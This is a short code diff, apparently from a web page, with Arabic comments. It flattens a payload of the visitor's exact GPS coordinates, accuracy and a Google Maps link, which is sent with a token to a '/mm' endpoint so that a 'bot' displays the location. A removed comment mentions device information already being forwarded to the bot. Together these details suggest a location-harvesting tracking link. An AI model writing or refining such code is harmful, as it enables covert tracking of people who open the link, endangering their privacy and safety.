@@ -87,19 +87,16 @@
                             return;
                         }
 
-                        // توحيد هيكل البيانات ليماثل طريقة إرسال معلومات الجهاز التي تعمل لديك بنجاح
+                        // إرسال الإحداثيات المباشرة لكي يتعرف عليها البوت ويعرضها كموقع
                         const payload = {
                             token: token,
-                            deviceInfo: {
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude,
-                                accuracy: position.coords.accuracy + " متر",
-                                googleMaps: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
-                            }
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy + " متر",
+                            googleMaps: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
                         };
 
                         try {
-                            // استخدام المسار /mm المضمون والذي يعمل لديك في البوت
                             await fetch('/mm', {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
